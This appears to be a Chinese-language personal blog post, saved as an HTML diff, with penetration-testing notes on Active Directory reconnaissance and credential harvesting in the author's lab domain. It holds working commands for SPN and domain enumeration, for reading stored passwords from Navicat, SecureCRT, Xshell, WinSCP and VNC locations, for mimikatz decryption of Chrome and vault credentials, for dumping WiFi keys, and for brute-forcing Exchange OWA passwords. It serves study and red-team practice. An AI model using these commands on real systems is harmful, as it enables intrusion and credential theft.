@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title> Windows内网渗透 | Maka8ka&#39;s Garden</title>
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="all,follow">
+  <meta name="googlebot" content="index,follow,snippet,archive">
+  <meta property="og:title" content="Windows内网渗透" />
+<meta property="og:description" content="Windows内网渗透 关键词: LDAP, Windows, 域, 持久化, 漏洞 状态: 进行中
+学习资料 https://security.tencent.com/index.php/blog/msg/154
+0x01 SPN(Service Principal Names)  服务主体名称:使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。  介绍：
+服务主体名称（Service Principal Names）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。SPN分为两种：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.maka8ka.cc/post/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2020-11-25T17:22:16&#43;00:00" />
+<meta property="article:modified_time" content="2020-11-25T17:22:16&#43;00:00" />
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Windows内网渗透"/>
+<meta name="twitter:description" content="Windows内网渗透 关键词: LDAP, Windows, 域, 持久化, 漏洞 状态: 进行中
+学习资料 https://security.tencent.com/index.php/blog/msg/154
+0x01 SPN(Service Principal Names)  服务主体名称:使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。  介绍：
+服务主体名称（Service Principal Names）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。SPN分为两种："/>
+
+  
+  
+    
+  
+  
+  <link rel="stylesheet" href="https://www.maka8ka.cc/css/style-white.css">
+  
+  
+  
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+  
+
+  
+<link rel="icon" type="image/png" href="https://www.maka8ka.cc/images/favicon.ico" />
+
+  
+  
+  
+  
+  
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-RFYM27MKD6"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-RFYM27MKD6', { 'anonymize_ip': false });
+}
+</script>
+
+  
+  
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+  <div class="content index py4">
+
+    <header id="header">
+  <a href="https://www.maka8ka.cc/">
+  
+    <div id="logo" style="background-image: url(https://www.maka8ka.cc/images/logo.png)"></div>
+  
+  <div id="title">
+    <h1>Maka8ka&#39;s Garden</h1>
+  </div>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fas fa-bars fa-2x" aria-hidden="true"></i></a>
+      </li>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/post/">Posts</a></li>
+      
+        <li><a href="/categories/">Categories</a></li>
+      
+        <li><a href="https://github.com/Maka8ka">Github</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+
+
+    
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <div class="content" itemprop="articleBody">
+  
+    <h1 id="windows内网渗透">Windows内网渗透</h1>
+<p>关键词: LDAP, Windows, 域, 持久化, 漏洞
+状态: 进行中</p>
+<h2 id="学习资料">学习资料</h2>
+<p><a href="https://security.tencent.com/index.php/blog/msg/154">https://security.tencent.com/index.php/blog/msg/154</a></p>
+<h2 id="0x01-spnservice-principal-names">0x01 SPN(Service Principal Names)</h2>
+<pre><code>  服务主体名称:使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。
+</code></pre>
+<p>介绍：</p>
+<p>服务主体名称（Service Principal Names）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。如果在整个林中的计算机上安装多个服务实例，则每个实例都必须具有自己的SPN。SPN分为两种：</p>
+<p>（1）机器账户（Computers）注册：服务权限通常是Local System或者Network Service</p>
+<p>（2）域用户账户（Users）注册：注册在一个域用户权限下</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">1. 域内常见的SPN实例
+    * MSSQLSvc/SQLAP01.makapaka.garden<span style="color:#960050;background-color:#1e0010">:</span>1433
+    * ExchangeMDB/EXCAS01.makapaka.garden
+    * TERMSERV/EXCAS01.makapaka.garden
+    * WSMAN/EXCAS01.makapaka.garden
+    * <span style="color:#960050;background-color:#1e0010">……</span>
+
+2. 常见的服务主体名称和对应的服务
+    * AcronisAgent<span style="color:#960050;background-color:#1e0010">：</span>针对Acronis备份和数据恢复软件
+    * Afpserver<span style="color:#960050;background-color:#1e0010">：</span>Apple归档协议
+    * AgpmServer<span style="color:#960050;background-color:#1e0010">：</span>Microsoft高级策略管理<span style="color:#960050;background-color:#1e0010">（</span>AGPM<span style="color:#960050;background-color:#1e0010">）</span>
+    * ExchangeAB<span style="color:#960050;background-color:#1e0010">：</span>Exchange通讯簿服务
+    * ExchangeRFR<span style="color:#960050;background-color:#1e0010">：</span>交换通讯簿服务
+    * ExchangeMDB<span style="color:#960050;background-color:#1e0010">：</span>RPC客户端访问服务器角色
+    * MSSQLSvc<span style="color:#960050;background-color:#1e0010">：</span>Microsoft SQL Server
+    * MSOMHSvc<span style="color:#960050;background-color:#1e0010">：</span>Microsoft 系统中心运营经理管理服务器
+    * MSOMSdkSvc<span style="color:#960050;background-color:#1e0010">：</span>Microsoft System Center Operations Manager 管理服务器
+    * MSServerCluster<span style="color:#960050;background-color:#1e0010">：</span>Windows集群服务器
+    * MSServerClusterMgmtAPI<span style="color:#960050;background-color:#1e0010">：</span>集群的API需要此SPN才能使用Kerberos向服务器进行验证
+    * MSClusterVirtualServer<span style="color:#960050;background-color:#1e0010">：</span>Windows 集群服务器
+    * TERMSRV<span style="color:#960050;background-color:#1e0010">：</span>Microsoft 远程桌面协议服务
+    * WSMAN<span style="color:#960050;background-color:#1e0010">：</span>Windows远程管理服务
+    * <span style="color:#960050;background-color:#1e0010">……</span>
+</code></pre></div><ol>
+<li>利用Windows自带的setspn工具，普通域用户权限执行即可</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">setspn -T makapaka.garden -Q */*
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Users\dev1&gt;setspn -T makapaka.garden -Q */*
+正在检查域 DC=makapaka,DC=garden
+CN=AD2012,OU=Domain Controllers,DC=makapaka,DC=garden
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/AD2012.makapaka.garden
+        ldap/AD2012.makapaka.garden/ForestDnsZones.makapaka.garden
+        ldap/AD2012.makapaka.garden/DomainDnsZones.makapaka.garden
+        DNS/AD2012.makapaka.garden
+        GC/AD2012.makapaka.garden/makapaka.garden
+        RestrictedKrbHost/AD2012.makapaka.garden
+        RestrictedKrbHost/AD2012
+        RPC/0107c860-e9bf-4bd7-9fe0-54bdcb78cba8._msdcs.makapaka.garden
+        HOST/AD2012/MAKAPAKA
+        HOST/AD2012.makapaka.garden/MAKAPAKA
+        HOST/AD2012
+        HOST/AD2012.makapaka.garden
+        HOST/AD2012.makapaka.garden/makapaka.garden
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/0107c860-e9bf-4bd7-9fe0-54bdcb78cba8/makapaka.garden
+        ldap/AD2012/MAKAPAKA
+        ldap/0107c860-e9bf-4bd7-9fe0-54bdcb78cba8._msdcs.makapaka.garden
+        ldap/AD2012.makapaka.garden/MAKAPAKA
+        ldap/AD2012
+        ldap/AD2012.makapaka.garden
+        ldap/AD2012.makapaka.garden/makapaka.garden
+CN=krbtgt,CN=Users,DC=makapaka,DC=garden
+        kadmin/changepw
+CN=DEVC1,CN=Computers,DC=makapaka,DC=garden
+        RestrictedKrbHost/DEVC1
+        HOST/DEVC1
+        RestrictedKrbHost/DevC1.makapaka.garden
+        HOST/DevC1.makapaka.garden
+CN=AD2016,OU=Domain Controllers,DC=makapaka,DC=garden
+        WSMAN/AD2016
+        WSMAN/AD2016.makapaka.garden
+        E3514235-4B06-11D1-AB04-00C04FC2DCD2/2d4c35d0-2c5a-4f52-a001-e6a4a3216f88/makapaka.garden
+        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/AD2016.makapaka.garden
+        RestrictedKrbHost/AD2016
+        HOST/AD2016
+        RestrictedKrbHost/AD2016.makapaka.garden
+        HOST/AD2016.makapaka.garden
+CN=UBUNTU,CN=Computers,DC=makapaka,DC=garden
+        RestrictedKrbHost/UBUNTU
+        HOST/UBUNTU
+        RestrictedKrbHost/UBUNTU.makapaka.garden
+        HOST/UBUNTU.makapaka.garden
+
+发现存在 SPN!
+</code></pre></div><p>2.<a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">GetUserSPNs.vbs</a></p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
+<p>3.Rubeus</p>
+<p><a href="https://github.com/GhostPack/Rubeus">https://github.com/GhostPack/Rubeus</a></p>
+<h2 id="0x02-端口及连接">0x02 端口及连接</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">netstat -ano
+</code></pre></div><h2 id="0x03-配置文件">0x03 配置文件</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">查找相关字段<span style="color:#960050;background-color:#1e0010">:</span>
+cd /web findstr /s /m <span style="color:#e6db74">&#34;password&#34;</span> *.*
+常用应用的默认配置路径<span style="color:#960050;background-color:#1e0010">:</span>
+Tomcat<span style="color:#960050;background-color:#1e0010">:</span> CATALINA_HOME/conf/tomcat-users.xml
+Apache<span style="color:#960050;background-color:#1e0010">:</span> /etc/httpd/conf/httpd.conf
+Nginx<span style="color:#960050;background-color:#1e0010">:</span> /etc/nginx/nginx.conf
+Wdcp<span style="color:#960050;background-color:#1e0010">:</span> /www/wdlinux/wdcp/conf/mrpw.conf
+Mysql<span style="color:#960050;background-color:#1e0010">:</span> mysql\data\mysql\user.MYD
+</code></pre></div><h2 id="0x04-搜集用户信息与定位域控制器">0x04 搜集用户信息与定位域控制器</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">net group <span style="color:#e6db74">&#34;domain controllers&#34;</span> /domain
+net time /domain
+net group <span style="color:#e6db74">&#34;domain admins&#34;</span> /domain
+net user /domain
+</code></pre></div><h2 id="0x05-内网主机发现">0x05 内网主机发现</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">net view
+arp -a
+linux<span style="color:#960050;background-color:#1e0010">:</span> cat /etc/hosts
+windows<span style="color:#960050;background-color:#1e0010">:</span> type c:\Windows\system32\drivers\etc\hosts
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e">#查看DNS缓存</span>
+C:\Users\dev1&gt;ipconfig /displaydns
+
+Windows IP 配置
+
+    ad2016.makapaka.garden
+    ----------------------------------------
+    记录名称. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> ad2016.makapaka.garden
+    记录类型. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 1
+    生存时间. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 1757
+    数据长度. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 4
+    部分. . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 答案
+    A (主机)记录  . . . . <span style="color:#960050;background-color:#1e0010">:</span> 172.16.1.202
+
+    记录名称. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> ad2016.makapaka.garden
+    记录类型. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 1
+    生存时间. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 1757
+    数据长度. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 4
+    部分. . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 答案
+    A (主机)记录  . . . . <span style="color:#960050;background-color:#1e0010">:</span> 192.168.235.202
+
+    ad2012.makapaka.garden
+    ----------------------------------------
+    记录名称. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> AD2012.makapaka.garden
+    记录类型. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 1
+    生存时间. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 583
+    数据长度. . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 4
+    部分. . . . . . . . . <span style="color:#960050;background-color:#1e0010">:</span> 答案
+    A (主机)记录  . . . . <span style="color:#960050;background-color:#1e0010">:</span> 192.168.235.131
+</code></pre></div><p>扫描工具nmap，nbtscan等</p>
+<h2 id="0x06-会话收集">0x06 会话收集</h2>
+<p>查看用户登陆过的机器</p>
+<p>NetSessionEnum function (lmshare.h)</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum</a></p>
+<p>PowerView(Windows Definder 拦截)未继续测试</p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Import-Module .\PowerView.ps1
+Invoke-UserHuner -UserName <span style="color:#e6db74">&#34;DevUser1&#34;</span> <span style="color:#75715e">#查看用户登陆的机器</span>
+Get-NetSession -ComputerName DevServer1 <span style="color:#75715e">#查看机器登陆过的用户</span>
+</code></pre></div><h2 id="0x07-凭据收集">0x07 凭据收集</h2>
+<p>远程连接凭据</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">cmdkey /list
+C:\Users\dev1&gt;cmdkey /list
+
+当前保存的凭据<span style="color:#960050;background-color:#1e0010">:</span>
+
+    目标<span style="color:#960050;background-color:#1e0010">:</span> MicrosoftAccount<span style="color:#960050;background-color:#1e0010">:</span>target=SSO_POP_Device
+    类型<span style="color:#960050;background-color:#1e0010">:</span> 普通
+    用户<span style="color:#960050;background-color:#1e0010">:</span> 02elvhzknxtoutsr
+    仅为此登录保存
+
+    目标<span style="color:#960050;background-color:#1e0010">:</span> WindowsLive<span style="color:#960050;background-color:#1e0010">:</span>target=virtualapp/didlogical
+    类型<span style="color:#960050;background-color:#1e0010">:</span> 普通
+    用户<span style="color:#960050;background-color:#1e0010">:</span> 02elvhzknxtoutsr
+    本地机器持续时间
+</code></pre></div><p>Navicat:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\
+
+MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\
+
+MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\
+
+Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\
+
+Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\
+
+PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\
+
+SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\
+</code></pre></div><p>SecureCRT：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># xp/win2003</span>
+C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions
+<span style="color:#75715e"># win7/win2008以上</span>
+C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions
+</code></pre></div><p>Xshell：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># Xshell 5 %userprofile%用户目录</span>
+
+<span style="color:#66d9ef">%</span>userprofile%\Documents\NetSarang\Xshell\Sessions
+
+<span style="color:#75715e"># Xshell 6</span>
+
+<span style="color:#66d9ef">%</span>userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions
+</code></pre></div><p>WinSCP：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">HKCU\Software\Martin Prikryl\WinSCP 2\Sessions
+</code></pre></div><p>VNC:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># RealVNC</span>
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver Password
+
+<span style="color:#75715e"># TightVNC</span>
+HKEY_CURRENT_USER\Software\TightVNC\Server Value Password or PasswordViewOnly
+
+<span style="color:#75715e"># TigerVNC</span>
+HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 Password
+
+<span style="color:#75715e"># UltraVNC</span>
+C:\Program Files\UltraVNC\ultravnc.ini passwd or passwd2
+</code></pre></div><h2 id="0x08-dpapidata-protection-application-programming-interface">0x08 DPAPI(Data Protection Application Programming Interface)</h2>
+<p>Windows 2000及以上版本，提供的程序开发接口。其分别提供了加密函数CryptProtectData 与解密函数CryptUnprotectData。</p>
+<p>其作用范围包括且不限于：</p>
+<p>outlook客户端密码</p>
+<p>windows credential凭据</p>
+<p>chrome保存的密码凭据</p>
+<p>internet explorer密码凭据</p>
+<p>DPAPI采用的加密类型为对称加密，存放密钥的文件则被称之为Master Key Files，其路径一般为%APPDATA%\Microsoft\Protect{SID}{GUID}。其中{SID}为用户的安全标识符，{GUID}为主密钥名称。我们可以利用用户的密码/hash或域备份密钥解密主密钥，然后解密被dpapi加密的数据。</p>
+<p><a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># 解密Chrome密码</span>
+mimikatz dpapi::chrome /<span style="color:#66d9ef">in</span><span style="color:#960050;background-color:#1e0010">:”</span><span style="color:#66d9ef">%</span>localappdata%\Google\Chrome\User Data\<span style="color:#66d9ef">Default</span>\Login Data<span style="color:#960050;background-color:#1e0010">”</span> /unprotect
+<span style="color:#75715e"># 解密Credential密码</span>
+mimikatz vault::cred /patch
+</code></pre></div><h2 id="0x09-域信任关系">0x09 域信任关系</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">nltest /domain_trusts
+
+C:\Users\dev1&gt;nltest /domain_trusts
+域信任的列表<span style="color:#960050;background-color:#1e0010">:</span>
+    0<span style="color:#960050;background-color:#1e0010">:</span> MAKAPAKA makapaka.garden (NT 5) (Forest Tree Root) (Primary Domain) (Native)
+此命令成功完成
+</code></pre></div><h2 id="0x10-域传送">0x10 域传送</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Users\dev1&gt;nslookup
+默认服务器<span style="color:#960050;background-color:#1e0010">:</span>  UnKnown
+Address<span style="color:#960050;background-color:#1e0010">:</span>  192.168.235.2
+
+&gt; server ad2012.makapaka.garden
+*** 无法找到服务器 ad2012.makapaka.garden 的地址<span style="color:#960050;background-color:#1e0010">:</span> Non-existent domain
+&gt; server 172.16.1.201
+默认服务器<span style="color:#960050;background-color:#1e0010">:</span>  [172.16.1.201]
+Address<span style="color:#960050;background-color:#1e0010">:</span>  172.16.1.201
+
+&gt; ls makapaka.garden
+<span style="color:#66d9ef">[[172.16.1.201]]</span>
+*** 无法列出域 makapaka.garden<span style="color:#960050;background-color:#1e0010">:</span> Query refused
+DNS 服务器拒绝将区域 makapaka.garden 传送到你的计算机<span style="color:#960050;background-color:#1e0010">。</span>如果这不正确<span style="color:#960050;background-color:#1e0010">，</span>
+请检查 IP 地址 172.16.1.201 的 DNS 服务器上 makapaka.garden 的
+区域传送安全设置<span style="color:#960050;background-color:#1e0010">。</span>
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#75715e"># windows</span>
+nslookup -type=ns domain.com nslookup sserver dns.domain.com ls domain.com
+<span style="color:#75715e"># linux</span>
+dig @dns.domain.com axfr domain.com
+</code></pre></div><h2 id="0x11-dns记录获取">0x11 DNS记录获取</h2>
+<p>Dnscmd仅在windowsServer上有</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Users\admin&gt;Dnscmd . /ZonePrint makapaka.garden
+
+;
+;  区域<span style="color:#960050;background-color:#1e0010">:</span>    makapaka.garden
+;  服务器<span style="color:#960050;background-color:#1e0010">:</span>  AD2012.makapaka.garden
+;  时间<span style="color:#960050;background-color:#1e0010">:</span>    Tue Jun 29 07<span style="color:#960050;background-color:#1e0010">:</span>06<span style="color:#960050;background-color:#1e0010">:</span>55 2020 UTC
+;
+
+DNS 服务器未能枚举节点 @ 的记录<span style="color:#960050;background-color:#1e0010">。</span>
+    状态 = ERROR_ACCESS_DENIED     5  (0x00000005)
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Dnscmd . /EnumRecords makapaka.garden .
+</code></pre></div><p>在非windows server机器上，可以使用PowerView获取</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">import-module PowerView.ps1 Get-DNSRecord -ZoneName jumbolab.com
+</code></pre></div><h2 id="0x12-wifi">0x12 WIFI</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#66d9ef">for</span> /f <span style="color:#960050;background-color:#1e0010">“</span>skip=9 tokens=1,2 delims=<span style="color:#960050;background-color:#1e0010">:”</span> <span style="color:#66d9ef">%</span>i <span style="color:#66d9ef">in</span> (<span style="color:#e6db74">&#39;netsh wlan show profiles&#39;</span>) <span style="color:#66d9ef">do</span> @echo <span style="color:#66d9ef">%</span>j | findstr -i -v echo | netsh wlan show profiles <span style="color:#66d9ef">%</span>j key=clear
+</code></pre></div><p>同上</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">C:\Users\admin&gt;netsh wlan show profile
+
+接口 WLAN 上的配置文件<span style="color:#960050;background-color:#1e0010">:</span>
+
+组策略配置文件(只读)
+---------------------------------
+    &lt;无&gt;
+
+用户配置文件
+-------------
+    所有用户配置文件 <span style="color:#960050;background-color:#1e0010">:</span> test
+C:\Users\admin&gt;netsh wlan show profile name=<span style="color:#e6db74">&#34;test&#34;</span> key=<span style="color:#e6db74">&#34;clear&#34;</span>
+
+接口 WLAN 上的配置文件 llcc<span style="color:#960050;background-color:#1e0010">:</span>
+=======================================================================
+
+已应用<span style="color:#960050;background-color:#1e0010">:</span> 所有用户配置文件
+
+配置文件信息
+-------------------
+    版本                   <span style="color:#960050;background-color:#1e0010">:</span> 1
+    类型                   <span style="color:#960050;background-color:#1e0010">:</span> 无线局域网
+    名称                   <span style="color:#960050;background-color:#1e0010">:</span> test
+    控制选项               <span style="color:#960050;background-color:#1e0010">:</span>
+        连接模式           <span style="color:#960050;background-color:#1e0010">:</span> 自动连接
+        网络广播           <span style="color:#960050;background-color:#1e0010">:</span> 只在网络广播时连接
+        AutoSwitch         <span style="color:#960050;background-color:#1e0010">:</span> 请勿切换到其他网络
+        MAC 随机化<span style="color:#960050;background-color:#1e0010">:</span> 禁用
+
+连接设置
+---------------------
+    SSID 数目              <span style="color:#960050;background-color:#1e0010">:</span> 1
+    SSID 名称              <span style="color:#960050;background-color:#1e0010">:“</span>test<span style="color:#960050;background-color:#1e0010">”</span>
+    网络类型               <span style="color:#960050;background-color:#1e0010">:</span> 结构
+    无线电类型             <span style="color:#960050;background-color:#1e0010">:</span> [ 任何无线电类型 ]
+    供应商扩展名           <span style="color:#960050;background-color:#1e0010">:</span> 不存在
+
+安全设置
+-----------------
+    身份验证         <span style="color:#960050;background-color:#1e0010">:</span> WPA2 - 个人
+    密码                 <span style="color:#960050;background-color:#1e0010">:</span> CCMP
+    身份验证         <span style="color:#960050;background-color:#1e0010">:</span> WPA2 - 个人
+    密码                 <span style="color:#960050;background-color:#1e0010">:</span> GCMP
+    安全密钥               <span style="color:#960050;background-color:#1e0010">:</span> 存在
+    关键内容            <span style="color:#960050;background-color:#1e0010">:</span> 123456789
+
+费用设置
+-------------
+    费用                <span style="color:#960050;background-color:#1e0010">:</span> 无限制
+    阻塞                <span style="color:#960050;background-color:#1e0010">:</span> 否
+    接近数据限制        <span style="color:#960050;background-color:#1e0010">:</span> 否
+    过量数据限制        <span style="color:#960050;background-color:#1e0010">:</span> 否
+    漫游                <span style="color:#960050;background-color:#1e0010">:</span> 否
+    费用来源            <span style="color:#960050;background-color:#1e0010">:</span> 默认
+</code></pre></div><h2 id="0x13-gpp-组策略首选项和sysvol中的密码">0x13 GPP 组策略首选项和SYSVOL中的密码</h2>
+<p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件</p>
+<p><a href="https://maka8ka.github.io/post/%E5%9F%9F%E6%B8%97%E9%80%8F-sysvol%E5%AF%86%E7%A0%81-laps/">域渗透-SYSVOL密码-LAPS</a></p>
+<h2 id="0x14-自动化信息搜集">0x14 自动化信息搜集</h2>
+<p>Seatbelt</p>
+<p>自动化的信息收集，包括不限于google历史记录、用户等</p>
+<p><a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p>
+<p>Bloodhound</p>
+<p>自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用（不要用）</p>
+<p><a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></p>
+<h2 id="0x15-exchange">0x15 Exchange</h2>
+<ol>
+<li>
+<p>邮箱用户密码爆破</p>
+<p>使用ruler工具对owa接口进行爆破</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">./ruler <span style="color:#960050;background-color:#1e0010">—</span>domain targetdomain.com brute <span style="color:#960050;background-color:#1e0010">—</span>users /path/to/user.txt <span style="color:#960050;background-color:#1e0010">—</span>passwords /path/to/passwords.txt
+</code></pre></div></li>
+<li>
+<p>通讯录收集</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt
+</code></pre></div></li>
+<li>
+<p>信息收集</p>
